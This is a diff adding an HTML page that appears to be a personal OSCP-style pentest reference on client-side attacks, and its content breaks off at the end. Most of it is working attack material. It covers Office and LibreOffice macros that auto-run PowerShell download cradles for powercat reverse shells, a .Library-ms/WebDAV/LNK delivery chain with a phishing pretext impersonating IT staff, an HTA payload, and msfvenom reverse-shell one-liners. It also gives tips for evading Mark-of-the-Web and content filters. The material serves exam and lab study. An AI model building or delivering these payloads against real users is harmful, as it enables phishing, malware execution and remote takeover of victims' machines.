@@ -1,0 +1,602 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Client-Side Attacks — Corey Clay</title>
+<meta name="description" content="Client-side attack reference — Office VBA macros (DOC/DOCM/XLSM) with AutoOpen chains, LibreOffice ODT/ODS macros, Windows .Library-ms → WebDAV → LNK chain, HTA via mshta.exe, msfvenom one-liners.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,600;0,700;0,800;1,400&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --ink:#000000;--ink-2:#121318;--panel:#15171c;--panel-2:#191c22;
+    --line:#262a33;--line-soft:#1b1e24;
+    --fg:#e8eaed;--fg-dim:#b2b6bd;--muted:#868c98;--muted-2:#5f6672;
+    --signal:#9fef00;--signal-soft:rgba(159,239,0,.14);--signal-line:rgba(159,239,0,.34);
+    --green:#7fae7a;--red:#d17a6e;--blue:#7fa6c9;
+    --f-display:"JetBrains Mono",ui-monospace,"SF Mono",Menlo,monospace;
+    --f-body:"JetBrains Mono",ui-monospace,"SF Mono",Menlo,monospace;
+    --f-mono:"JetBrains Mono",ui-monospace,"SF Mono",Menlo,monospace;
+    box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px);
+  }
+  *,*::before,*::after{box-sizing:border-box}
+  html{scroll-behavior:smooth;scroll-padding-top:calc(126px + env(safe-area-inset-top,0px))}
+  @media (prefers-reduced-motion:reduce){html{scroll-behavior:auto}}
+  body{margin:0;background:var(--ink);color:var(--fg);font-family:var(--f-body);font-size:15px;line-height:1.7;
+    -webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility;}
+  .grid-fade{position:fixed;inset:0;pointer-events:none;z-index:0;background-color:var(--ink);background-image:linear-gradient(180deg,transparent 0%,var(--ink) 46%),linear-gradient(var(--line-soft) 1px,transparent 1px),linear-gradient(90deg,var(--line-soft) 1px,transparent 1px),radial-gradient(1100px 520px at 82% -8%,rgba(159,239,0,.05),transparent 60%);background-size:auto,64px 64px,64px 64px,auto;background-position:0 0,-1px -1px,-1px -1px,0 0}
+  a{color:inherit;text-decoration:none}
+  ::selection{background:var(--signal-soft);color:var(--fg)}
+  .wrap{max-width:900px;margin:0 auto;padding:0 24px;position:relative;z-index:1}
+
+  header.site{position:sticky;top:0;z-index:50;background:rgba(23,25,31,.97);
+    border-bottom:1px solid var(--line-soft);padding-top:env(safe-area-inset-top,0px)}
+  .bar{display:flex;align-items:center;justify-content:space-between;height:64px;max-width:900px;margin:0 auto;padding:0 24px}
+  .brand{display:flex;align-items:center;gap:11px;font-family:var(--f-mono);font-size:14px;letter-spacing:.02em}
+  .brand .dot{width:9px;height:9px;border-radius:50%;background:var(--signal);box-shadow:0 0 0 3px var(--signal-soft);flex:none}
+  .brand b{color:var(--fg);font-weight:700}
+  .brand span{color:var(--muted)}
+  nav.top{display:flex;gap:24px;font-family:var(--f-mono);font-size:13px;color:var(--muted)}
+  nav.top a{transition:color .18s ease}
+  nav.top a:hover,nav.top a.here{color:var(--signal)}
+  nav.top a:focus-visible,.brand:focus-visible{outline:2px solid var(--signal);outline-offset:4px;border-radius:2px}
+  @media (max-width:680px){nav.top a:not(.here):not(.home){display:none}}
+
+  .cs-hero{padding:56px 0 22px}
+  .cs-hero .kicker{font-family:var(--f-mono);font-size:12.5px;color:var(--signal);margin:0 0 10px}
+  .cs-hero .kicker a{color:var(--muted)}
+  .cs-hero .kicker a:hover{color:var(--signal)}
+  .cs-hero h1{font-family:var(--f-display);font-weight:600;font-size:clamp(30px,5vw,46px);letter-spacing:-.02em;
+    line-height:1.05;margin:0 0 14px;color:var(--fg)}
+  .cs-hero p{max-width:64ch;color:var(--fg-dim);font-size:18px;margin:0}
+
+  .sec-nav{position:sticky;top:64px;z-index:40;background:rgba(23,25,31,.98);
+    border-bottom:1px solid var(--line-soft);padding:11px 0}
+  .sec-nav .inner{display:flex;gap:7px;overflow-x:auto;scrollbar-width:none;max-width:900px;margin:0 auto;padding:0 24px}
+  .sec-nav .inner::-webkit-scrollbar{display:none}
+  .sec-nav a{font-family:var(--f-mono);font-size:11.5px;color:var(--muted);white-space:nowrap;
+    padding:5px 11px;border:1px solid var(--line);border-radius:20px;transition:.16s;flex:none}
+  .sec-nav a:hover,.sec-nav a:focus-visible{color:var(--signal);border-color:var(--signal-line)}
+  .sec-nav a.here{color:var(--signal);border-color:var(--signal-line);background:var(--signal-soft)}
+  .sec-nav a:focus-visible{outline:2px solid var(--signal);outline-offset:2px}
+
+  main{padding:12px 0 40px}
+  main h2{font-family:var(--f-display);font-weight:600;font-size:clamp(23px,3.2vw,30px);letter-spacing:-.01em;
+    color:var(--fg);margin:56px 0 8px;padding-top:20px;border-top:1px solid var(--line-soft);scroll-margin-top:130px}
+  main h2:first-of-type{border-top:0;margin-top:20px}
+  main h3{font-family:var(--f-display);font-weight:500;font-size:19px;color:var(--fg);margin:30px 0 10px}
+  main h4{font-family:var(--f-mono);font-size:14px;color:var(--signal);margin:22px 0 8px;letter-spacing:.01em}
+  main p{color:var(--fg-dim);margin:0 0 16px;max-width:74ch}
+  main strong{color:var(--fg);font-weight:600}
+  main a{color:var(--signal)}
+  main a:hover{text-decoration:underline}
+  main ul,main ol{color:var(--fg-dim);margin:0 0 18px;padding-left:22px;max-width:74ch}
+  main li{margin-bottom:6px}
+  main ul li::marker{color:var(--signal)}
+  main hr{border:0;border-top:1px solid var(--line-soft);margin:8px 0}
+
+  .code-wrap{position:relative;margin:0 0 18px}
+  main pre{background:var(--ink-2);border:1px solid var(--line);border-radius:8px;overflow-x:auto;
+    margin:0;padding:15px 17px;font-family:var(--f-mono);font-size:13px;line-height:1.7;color:var(--fg-dim)}
+  main pre code{font-family:var(--f-mono);background:none;padding:0;color:inherit;white-space:pre}
+  main :not(pre) > code{font-family:var(--f-mono);font-size:.86em;background:var(--panel-2);
+    border:1px solid var(--line-soft);border-radius:5px;padding:1px 6px;color:var(--signal)}
+  .copy{position:absolute;top:8px;right:8px;font-family:var(--f-mono);font-size:11px;color:var(--muted);
+    background:var(--panel);border:1px solid var(--line);border-radius:6px;padding:4px 10px;cursor:pointer;transition:.15s;opacity:.85}
+  .copy:hover,.copy:focus-visible{color:var(--signal);border-color:var(--signal-line);opacity:1}
+  .copy:focus-visible{outline:2px solid var(--signal);outline-offset:2px}
+  .copy.done{color:var(--green);border-color:rgba(127,174,122,.4)}
+
+  .table-scroll{overflow-x:auto;margin:0 0 20px;border:1px solid var(--line-soft);border-radius:8px}
+  main table{border-collapse:collapse;width:100%;font-size:14px;min-width:520px}
+  main th{font-family:var(--f-mono);font-size:12px;text-align:left;color:var(--signal);
+    background:var(--panel-2);padding:10px 14px;border-bottom:1px solid var(--line);font-weight:500;white-space:nowrap}
+  main td{padding:10px 14px;border-bottom:1px solid var(--line-soft);color:var(--fg-dim);vertical-align:top}
+  main tr:last-child td{border-bottom:0}
+  main td code{white-space:nowrap}
+
+  footer.site{border-top:1px solid var(--line-soft);padding:44px 0 60px;margin-top:40px}
+  .foot{display:flex;flex-wrap:wrap;justify-content:space-between;gap:20px;align-items:center}
+  .foot .f-brand{font-family:var(--f-mono);font-size:13px;color:var(--muted)}
+  .foot .f-brand b{color:var(--fg)}
+  .foot-links{display:flex;gap:22px;font-family:var(--f-mono);font-size:13px}
+  .foot-links a{color:var(--muted);transition:color .16s}
+  .foot-links a:hover,.foot-links a:focus-visible{color:var(--signal)}
+  .disclaimer{font-family:var(--f-mono);font-size:11.5px;color:var(--muted-2);margin:30px 0 0;max-width:74ch;line-height:1.7;
+    border-left:2px solid var(--line);padding-left:16px}
+
+  .hub{display:grid;grid-template-columns:repeat(2,1fr);gap:18px;margin:14px 0 10px}
+  @media (max-width:640px){.hub{grid-template-columns:1fr}}
+  .hub-card{display:block;border:1px solid var(--line);border-radius:11px;padding:24px 24px 22px;background:var(--panel);
+    transition:border-color .16s ease,transform .16s ease;position:relative}
+  .hub-card:hover{border-color:var(--signal-line);transform:translateY(-3px)}
+  .hub-card .idx{font-family:var(--f-mono);font-size:12px;color:var(--signal)}
+  .hub-card h3{font-family:var(--f-display);font-weight:600;font-size:21px;color:var(--fg);margin:8px 0 8px;letter-spacing:-.01em}
+  .hub-card p{font-family:var(--f-body);font-size:15.5px;color:var(--muted);margin:0 0 16px;line-height:1.5}
+  .hub-card .tags{display:flex;flex-wrap:wrap;gap:6px}
+  .hub-card .t{font-family:var(--f-mono);font-size:10.5px;color:var(--fg-dim);background:var(--panel-2);
+    border:1px solid var(--line-soft);padding:3px 8px;border-radius:5px}
+  .hub-card .go{position:absolute;top:22px;right:22px;font-family:var(--f-mono);font-size:16px;color:var(--muted);transition:.16s}
+  .hub-card:hover .go{color:var(--signal);transform:translateX(2px)}
+  .hub-card.soon{opacity:.6;pointer-events:none}
+  .hub-card.soon .go{content:''}
+  .hub-note{font-family:var(--f-mono);font-size:12.5px;color:var(--muted-2);margin-top:26px;border-left:2px solid var(--line);padding-left:16px}
+  .hub-empty{border:1px dashed var(--line);border-radius:12px;padding:52px 30px;text-align:center;margin:14px 0 10px}
+  .hub-empty .ico{font-family:var(--f-mono);font-size:13px;color:var(--signal);margin:0 0 12px}
+  .hub-empty h3{font-family:var(--f-display);font-weight:500;font-size:20px;color:var(--fg);margin:0 0 8px}
+  .hub-empty p{font-family:var(--f-body);font-size:15.5px;color:var(--muted);margin:0 auto;max-width:46ch;line-height:1.55}
+</style>
+</head>
+<body>
+<div class="grid-fade" aria-hidden="true"></div>
+
+<header class="site" id="top">
+  <div class="bar">
+    <a class="brand" href="index.html" aria-label="Home">
+      <span class="dot" aria-hidden="true"></span><b>corey.clay</b><span>/ other / client-side attacks</span>
+    </a>
+    <nav class="top" aria-label="Primary">
+      <a class="home" href="index.html">home</a>
+      <a href="index.html#log">log</a>
+      <a href="methodology.html">methodology</a>
+      <a href="enumeration.html">enumeration</a>
+      <a href="pre-exploitation.html">pre-exploitation</a>
+      <a href="exploitation.html">exploitation</a>
+      <a href="post-exploitation.html">post-exploitation</a>
+      <a href="tools-utilities.html">tools &amp; utilities</a>
+      <a class="here" href="other.html" aria-current="page">other</a>
+      <a href="https://www.linkedin.com/in/corey-clay-664943b8/" target="_blank" rel="noopener">linkedin</a>
+    </nav>
+  </div>
+</header>
+
+<div class="cs-hero wrap">
+  <p class="kicker"><a href="other.html">&lsaquo; other</a> &nbsp;/&nbsp; // run-on-the-client</p>
+  <h1>Client-Side Attacks</h1>
+  <p>Client-side attacks target software users run — Office, Explorer, browsers. The OSCP-classic buildable payloads: Office VBA macros with AutoOpen / Document_Open / Auto_Open chains, LibreOffice Basic macros bound to Open Document for reviewer-bot targets, Windows `.Library-ms` → WebDAV → LNK chain for Explorer-triggered execution, HTA via mshta.exe, and msfvenom one-liners for every format.</p>
+</div>
+
+<nav class="sec-nav" aria-label="Jump to section">
+  <div class="inner">
+      <a href="#target-recon-before-payload-design">Target Recon Before Payload Design</a>
+      <a href="#office-vba-macros">Office VBA Macros</a>
+      <a href="#libreoffice-openoffice-macros-odt-ods">LibreOffice / OpenOffice Macros (ODT / ODS)</a>
+      <a href="#windows-library-files-library-ms">Windows Library Files (<code>.Library-ms</code>)</a>
+      <a href="#hta-html-applications-via-mshta-exe">HTA (HTML Applications via <code>mshta.exe</code>)</a>
+      <a href="#msfvenom-one-liners-for-client-side-payloads">msfvenom One-Liners for Client-Side Payloads</a>
+      <a href="#payload-staging-over-smb-no-http-needed">Payload Staging over SMB (no HTTP needed)</a>
+      <a href="#common-client-side-extensions-attackers-ship">Common Client-Side Extensions Attackers Ship</a>
+  </div>
+</nav>
+
+<main class="wrap">
+<p>Client-side attacks target the software users <strong>run</strong> — Office, Explorer, browsers — not the servers they connect to. Every payload here needs a human to open something. Pair with <code>credential-phishing.md</code> for the delivery pretext and <code>initial-access-redteam.md</code> for delivery containers (ISO/IMG/WIM).</p>
+<p>Focus of this page: the OSCP-classic buildable payloads:</p>
+<ol>
+<li>Office VBA macro (<code>.doc</code> / <code>.docm</code> / <code>.xlsm</code>)</li>
+<li>Windows Library file (<code>.Library-ms</code> -&gt; WebDAV -&gt; <code>.lnk</code>)</li>
+<li>HTA (<code>.hta</code> via <code>mshta.exe</code>)</li>
+</ol>
+<hr />
+<h2 id="target-recon-before-payload-design">Target Recon Before Payload Design</h2>
+<h3>Metadata mining with <code>exiftool</code></h3>
+<p>Grab any binary the target publishes (brochures, resumes on LinkedIn, PDFs on their site) and read every tag:</p>
+<pre><code class="language-bash">exiftool -a -u brochure.pdf
+</code></pre>
+<p>Flag legend:</p>
+<ul>
+<li><code>-a</code> — show all tags including duplicates</li>
+<li><code>-u</code> — show unknown tags too</li>
+</ul>
+<p>Takeaways:</p>
+<ul>
+<li><strong>Creator/Producer</strong> strings tell you the target's Office version (payload can target that specifically)</li>
+<li><strong>Author</strong> name -&gt; potential employee to impersonate or phish</li>
+<li><strong>GPS</strong> tags on smartphone photos -&gt; facility location</li>
+</ul>
+<p>Batch multiple files:</p>
+<pre><code class="language-bash">exiftool -r -Author -Producer -Creator -Software /path/to/dump/*.pdf
+exiftool image.jpg | grep -Ei 'GPS|Camera|Make|Model'
+pdfinfo brochure.pdf
+</code></pre>
+<h3>Client fingerprinting via beacon</h3>
+<p>Get the target to load an attacker URL so their browser leaks headers, geolocation, plugin list.</p>
+<ul>
+<li><strong>Canarytokens (canarytokens.org)</strong> — free web-bug URLs; every click posts back to the dashboard with IP, User-Agent, referrer</li>
+<li>Your own HTTP server for cleaner control:</li>
+</ul>
+<pre><code class="language-bash">python3 -m http.server 80
+## every request logs IP, request line, User-Agent, referrer
+</code></pre>
+<p>Or serve a 1x1 pixel with a small PHP/Python script that logs <code>X-Forwarded-For</code>, <code>User-Agent</code>, <code>Accept-Language</code>, <code>Sec-CH-UA</code>.</p>
+<hr />
+<h2 id="office-vba-macros">Office VBA Macros</h2>
+<h3>Understanding Protected View + MOTW</h3>
+<p>Office 2016+ opens attachments in <strong>Protected View</strong> — read-only, macros disabled. The victim must:</p>
+<ol>
+<li>Click <strong>Enable Editing</strong> (exits Protected View)</li>
+<li>Click <strong>Enable Content</strong> (enables macros)</li>
+</ol>
+<p>Mark-of-the-Web (MOTW) makes this harder for internet-sourced files (see <code>credential-phishing.md#Mark-of-the-Web-MOTW</code>). Workarounds:</p>
+<ul>
+<li>Ship inside <strong>ZIP / ISO / IMG / VHD</strong> — MOTW does not propagate to unzipped contents on many Windows versions</li>
+<li>Use <code>.doc</code> (Office 97-2003 binary) — sometimes bypasses newer macro-blocking policies vs <code>.docm</code></li>
+<li>Sign the macro (needs a paid cert or a leaked one)</li>
+</ul>
+<h3>Building the macro — step by step</h3>
+<p>Step 1: create an empty <code>.doc</code> (File -&gt; Save As -&gt; <strong>Word 97-2003 Document</strong>). VBA in <code>.doc</code> triggers on the older <code>AutoOpen()</code> name too, giving dual-hook coverage.</p>
+<p>Step 2: open the VBA editor. <code>View</code> ribbon -&gt; <code>Macros</code> -&gt; <code>View Macros</code> -&gt; <code>Create</code>. VBA IDE opens with an empty sub:</p>
+<pre><code class="language-vba">Sub MyMacro()
+'
+' MyMacro Macro
+'
+'
+End Sub
+</code></pre>
+<p>Step 3: prove code execution — pop a PowerShell. <code>Wscript.Shell.Run</code> executes a command as the current user:</p>
+<pre><code class="language-vba">Sub MyMacro()
+  CreateObject(&quot;Wscript.Shell&quot;).Run &quot;powershell&quot;
+End Sub
+</code></pre>
+<p>Step 4: chain the auto-run hooks. Word triggers <code>AutoOpen()</code> when a <code>.doc</code> opens; both <code>.doc</code> and <code>.docm</code> trigger <code>Document_Open()</code>. Register both so the payload fires regardless of version quirks:</p>
+<pre><code class="language-vba">Sub AutoOpen()
+  MyMacro
+End Sub
+Sub Document_Open()
+  MyMacro
+End Sub
+Sub MyMacro()
+  CreateObject(&quot;Wscript.Shell&quot;).Run &quot;powershell&quot;
+End Sub
+</code></pre>
+<p>Excel equivalent hook is <code>Auto_Open()</code> (underscore, not camelCase):</p>
+<pre><code class="language-vba">Sub Auto_Open()
+  MyMacro
+End Sub
+</code></pre>
+<p>Step 5: swap the payload for a reverse shell one-liner:</p>
+<pre><code>powershell.exe -nop -w hidden -enc &lt;BASE64-of-download-cradle&gt;
+</code></pre>
+<p>Where the download cradle (before base64) is:</p>
+<pre><code class="language-powershell">IEX(New-Object System.Net.WebClient).DownloadString('http://&lt;LHOST&gt;/powercat.ps1'); powercat -c &lt;LHOST&gt; -p &lt;LPORT&gt; -e powershell
+</code></pre>
+<p>Build the base64 on Kali via PowerShell (<code>pwsh</code>). PowerShell <code>-enc</code> expects <strong>UTF-16LE</strong> bytes, which is what <code>[System.Text.Encoding]::Unicode</code> produces:</p>
+<pre><code class="language-bash">pwsh
+&gt; $cmd = &quot;IEX(New-Object System.Net.WebClient).DownloadString('http://&lt;LHOST&gt;/powercat.ps1'); powercat -c &lt;LHOST&gt; -p &lt;LPORT&gt; -e powershell&quot;
+&gt; $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
+&gt; $b64 = [Convert]::ToBase64String($bytes)
+&gt; &quot;powershell.exe -nop -w hidden -enc $b64&quot;
+</code></pre>
+<p>Step 6: chunk the base64 string — VBA line-length limit is 1023 chars. Use this Python helper to split into 50-char VBA lines:</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+s = &quot;powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwA...&quot;
+n = 50
+for i in range(0, len(s), n):
+    print('Str = Str + &quot;' + s[i:i+n] + '&quot;')
+</code></pre>
+<p>Paste the printed lines into the macro:</p>
+<pre><code class="language-vba">Sub AutoOpen()
+    MyMacro
+End Sub
+Sub Document_Open()
+    MyMacro
+End Sub
+Sub MyMacro()
+    Dim Str As String
+    Str = Str + &quot;powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU&quot;
+    Str = Str + &quot;AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd&quot;
+    Str = Str + &quot;AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB&quot;
+    ' ...more chunks...
+    Str = Str + &quot;A== &quot;
+    CreateObject(&quot;Wscript.Shell&quot;).Run Str
+End Sub
+</code></pre>
+<p>Step 7: deliver + catch. On Kali:</p>
+<pre><code class="language-bash">python3 -m http.server 80                # serve powercat.ps1 next to your working dir
+nc -nvlp 4444                            # catcher
+</code></pre>
+<p>Victim double-clicks <code>report.doc</code> -&gt; Enable Editing -&gt; Enable Content -&gt; <code>AutoOpen()</code> fires -&gt; PowerShell downloads powercat -&gt; reverse shell to Kali.</p>
+<hr />
+<h2 id="libreoffice-openoffice-macros-odt-ods">LibreOffice / OpenOffice Macros (ODT / ODS)</h2>
+<p><strong>When to use:</strong> an app accepts only office documents (<code>.odt</code>/<code>.ods</code>) — often via a "submit your resume / spreadsheet" upload or a mailbox — and a <strong>reviewer bot opens the file in LibreOffice</strong> (PG Craft — ODT upload; PG Hepet — ODS mailed to <code>mailadmin</code>). A LibreOffice <strong>Basic</strong> macro bound to the <em>Open Document</em> event runs when the bot opens the file. This is the LibreOffice analogue of an Office VBA macro; Office tricks don't apply.</p>
+<p><strong>Manual ODT build (LibreOffice Writer):</strong></p>
+<pre><code class="language-basic">' Tools -&gt; Macros -&gt; Organize Macros -&gt; Basic -&gt; Organizer -&gt; Modules -&gt;
+'   expand &quot;Untitled 1 -&gt; Standard&quot; -&gt; New -&gt; Module1, then paste:
+Sub Main
+    Shell(&quot;cmd /c powershell -c &quot;&quot;IEX(New-Object Net.WebClient).DownloadString('http://&lt;LHOST&gt;:8000/shell.ps1')&quot;&quot;&quot;)
+End Sub
+</code></pre>
+<ol>
+<li><strong>Save As → ODF Text Document → <code>shell.odt</code></strong> first (so the doc becomes a selectable event scope).</li>
+<li><strong>Tools → Customize → Events</strong> → set <strong>Save in: shell.odt</strong> (NOT LibreOffice, or the macro won't travel with the file) → bind <strong>Open Document → Macro… → shell.odt → Standard → Module1 → Main</strong>.</li>
+<li>The macro <strong>must live inside the document</strong>, not in "My Macros".</li>
+</ol>
+<p><strong>Automated ODS with MMG-LO</strong> (keeps shellcode out of the file — fetches a cradle at runtime):</p>
+<pre><code class="language-bash">git clone https://github.com/vysecurity/MMG-LO &amp;&amp; cd MMG-LO
+## Edit build_payload in mmg-ods.py to a powercat/IEX download cradle, then:
+python3 mmg-ods.py windows &lt;LHOST&gt; &lt;LPORT&gt;      # -&gt; file.ods
+sudo python3 -m http.server 80                  # serve powercat.ps1 / shell.ps1 from here
+</code></pre>
+<p><strong>Deliver to an auto-open mail bot with swaks</strong> (PG Hepet — server opens anything mailed to <code>mailadmin</code>):</p>
+<pre><code class="language-bash">swaks --to mailadmin@localhost --from you@localhost --server &lt;IP&gt; \
+      --header &quot;Subject: Contacts spreadsheet&quot; --body &quot;please print&quot; \
+      --attach @file.ods
+</code></pre>
+<hr />
+<h2 id="windows-library-files-library-ms">Windows Library Files (<code>.Library-ms</code>)</h2>
+<p>A <code>.Library-ms</code> file is XML that tells Explorer "this virtual library is really a remote folder". Point it at your WebDAV share and Explorer auto-mounts the share when the victim double-clicks the file. Anything visible in that folder (like a <code>.lnk</code>) is now one click away from execution.</p>
+<h3>Anonymous WebDAV on Kali</h3>
+<p><code>wsgidav</code> is the simplest Python DAV server.</p>
+<pre><code class="language-bash">sudo apt install python3-wsgidav
+mkdir /home/kali/webdav
+touch /home/kali/webdav/test.txt
+wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
+</code></pre>
+<p>Flag legend:</p>
+<ul>
+<li><code>--host=0.0.0.0</code> — listen on every interface</li>
+<li><code>--port=80</code> — default HTTP port so Explorer maps it cleanly</li>
+<li><code>--auth=anonymous</code> — no credentials required</li>
+<li><code>--root &lt;path&gt;</code> — folder to expose</li>
+</ul>
+<p>Verify from Kali: <code>http://&lt;LHOST&gt;/</code> should show the file listing.</p>
+<h3>The <code>.Library-ms</code> XML</h3>
+<p>Root element:</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;libraryDescription xmlns=&quot;http://schemas.microsoft.com/windows/2009/library&quot;&gt;
+&lt;/libraryDescription&gt;
+</code></pre>
+<p>Display name via string-table resource (avoids the literal "shell32" that some content filters flag):</p>
+<pre><code class="language-xml">&lt;name&gt;@windows.storage.dll,-34582&lt;/name&gt;
+&lt;version&gt;6&lt;/version&gt;
+</code></pre>
+<p>Pin to the sidebar + friendly icon (<code>imageres.dll,-1003</code> = Pictures folder icon, <code>-1002</code> = Documents):</p>
+<pre><code class="language-xml">&lt;isLibraryPinned&gt;true&lt;/isLibraryPinned&gt;
+&lt;iconReference&gt;imageres.dll,-1003&lt;/iconReference&gt;
+</code></pre>
+<p>Folder type so Explorer treats the contents like Documents:</p>
+<pre><code class="language-xml">&lt;templateInfo&gt;
+  &lt;folderType&gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}&lt;/folderType&gt;
+&lt;/templateInfo&gt;
+</code></pre>
+<p>Payload half — <code>searchConnectorDescription</code> pointing at your WebDAV:</p>
+<pre><code class="language-xml">&lt;searchConnectorDescriptionList&gt;
+  &lt;searchConnectorDescription&gt;
+    &lt;isDefaultSaveLocation&gt;true&lt;/isDefaultSaveLocation&gt;
+    &lt;isSupported&gt;false&lt;/isSupported&gt;
+    &lt;simpleLocation&gt;
+      &lt;url&gt;http://&lt;LHOST&gt;&lt;/url&gt;
+    &lt;/simpleLocation&gt;
+  &lt;/searchConnectorDescription&gt;
+&lt;/searchConnectorDescriptionList&gt;
+</code></pre>
+<p>Complete <code>config.Library-ms</code> (copy-paste ready):</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;libraryDescription xmlns=&quot;http://schemas.microsoft.com/windows/2009/library&quot;&gt;
+  &lt;name&gt;@windows.storage.dll,-34582&lt;/name&gt;
+  &lt;version&gt;6&lt;/version&gt;
+  &lt;isLibraryPinned&gt;true&lt;/isLibraryPinned&gt;
+  &lt;iconReference&gt;imageres.dll,-1003&lt;/iconReference&gt;
+  &lt;templateInfo&gt;
+    &lt;folderType&gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}&lt;/folderType&gt;
+  &lt;/templateInfo&gt;
+  &lt;searchConnectorDescriptionList&gt;
+    &lt;searchConnectorDescription&gt;
+      &lt;isDefaultSaveLocation&gt;true&lt;/isDefaultSaveLocation&gt;
+      &lt;isSupported&gt;false&lt;/isSupported&gt;
+      &lt;simpleLocation&gt;
+        &lt;url&gt;http://&lt;LHOST&gt;&lt;/url&gt;
+      &lt;/simpleLocation&gt;
+    &lt;/searchConnectorDescription&gt;
+  &lt;/searchConnectorDescriptionList&gt;
+&lt;/libraryDescription&gt;
+</code></pre>
+<h3>Create the <code>.lnk</code> shortcut in the WebDAV share</h3>
+<p>Right-click Kali/Windows desktop -&gt; New -&gt; Shortcut. Target:</p>
+<pre><code>powershell.exe -c &quot;IEX(New-Object System.Net.WebClient).DownloadString('http://&lt;LHOST&gt;:8000/powercat.ps1'); powercat -c &lt;LHOST&gt; -p &lt;LPORT&gt; -e powershell&quot;
+</code></pre>
+<p>Save as <code>automatic_configuration.lnk</code>, copy into <code>/home/kali/webdav/</code>. Optionally set a benign icon (<code>imageres.dll,-97</code> = wrench).</p>
+<h3>Full delivery chain — Kali three-terminal setup</h3>
+<pre><code class="language-bash">## Terminal 1 — WebDAV serving the .lnk
+wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
+
+## Terminal 2 — HTTP server for powercat.ps1
+cd /home/kali &amp;&amp; python3 -m http.server 8000
+
+## Terminal 3 — reverse shell catcher
+nc -nvlp 4444
+</code></pre>
+<p>Email <code>config.Library-ms</code> as an attachment (see <code>credential-phishing.md#Sending-the-Email</code>). Victim opens it -&gt; Explorer maps <code>http://&lt;LHOST&gt;/</code> -&gt; <code>automatic_configuration.lnk</code> becomes visible -&gt; victim double-clicks it -&gt; UAC "Do you want to run this application?" prompt -&gt; reverse shell.</p>
+<h3>Pretext body that pairs with the <code>.Library-ms</code></h3>
+<pre><code>Hello! My name is Dwight, and I'm a new member of the IT Team.
+This week I am completing some configurations we rolled out last week.
+To make this easier, I've attached a file that will automatically
+perform each step. Could you download the attachment, open the
+directory, and double-click &quot;automatic_configuration&quot;? Once you
+confirm the configuration in the window that appears, you're all done!
+If you have any questions, or run into any problems, please let me
+know!
+</code></pre>
+<h3>SMB drop alternative (writable share instead of email)</h3>
+<pre><code class="language-bash">cd /home/kali/webdav
+rm test.txt                                                # remove the noise file
+smbclient //&lt;TARGET&gt;/share -c 'put config.Library-ms'      # -c runs one command then exits
+## blank password = null session; or supply -U user%pass
+</code></pre>
+<p>Wait for someone browsing the share to double-click. Catcher fires.</p>
+<hr />
+<h2 id="hta-html-applications-via-mshta-exe">HTA (HTML Applications via <code>mshta.exe</code>)</h2>
+<p><code>.hta</code> files run as trusted Windows applications with cscript-level rights. Victim runs <code>mshta http://&lt;LHOST&gt;/payload.hta</code> (or downloads and double-clicks).</p>
+<p><code>payload.hta</code>:</p>
+<pre><code class="language-html">&lt;html&gt;
+&lt;head&gt;&lt;HTA:APPLICATION APPLICATIONNAME=&quot;Config&quot; WINDOWSTATE=&quot;minimize&quot;&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;script language=&quot;VBScript&quot;&gt;
+Set shell = CreateObject(&quot;wscript.Shell&quot;)
+shell.Run &quot;powershell.exe -nop -w hidden -enc &lt;b64&gt;&quot;, 0, false
+self.close
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>Serve from Kali (<code>python3 -m http.server</code>) and land the victim on it via a phishing link. <code>mshta</code> will fetch and run without a save-file prompt on most default Windows configs.</p>
+<hr />
+<h2 id="msfvenom-one-liners-for-client-side-payloads">msfvenom One-Liners for Client-Side Payloads</h2>
+<pre><code class="language-bash">## HTA (auto-generated form)
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;LHOST&gt; LPORT=&lt;LPORT&gt; -f hta-psh -o payload.hta
+
+## Word macro (VBA output ready to paste)
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;LHOST&gt; LPORT=&lt;LPORT&gt; -f vba -o macro.vba
+
+## EXE
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;LHOST&gt; LPORT=&lt;LPORT&gt; -f exe -o beacon.exe
+
+## WScript JS payload
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;LHOST&gt; LPORT=&lt;LPORT&gt; -f js-le -o pl.js
+</code></pre>
+<blockquote>
+<p><code>windows/x64/meterpreter/*</code> is <strong>EXAM-RESTRICTED</strong> — Meterpreter counts as your one Metasploit target. Prefer <code>windows/x64/shell_reverse_tcp</code> (plain reverse shell) for the other targets and catch it with <code>nc</code>.</p>
+</blockquote>
+<hr />
+<h2 id="payload-staging-over-smb-no-http-needed">Payload Staging over SMB (no HTTP needed)</h2>
+<p>Bypasses some content filters that alarm on <code>wget/curl</code>:</p>
+<pre><code class="language-bash">## Kali — anonymous SMB server hosting the payload
+impacket-smbserver share $(pwd) -smb2support
+</code></pre>
+<p>Victim command inside the macro / <code>.lnk</code>:</p>
+<pre><code class="language-powershell">\\&lt;LHOST&gt;\share\beacon.exe
+</code></pre>
+<p>Flag legend:</p>
+<ul>
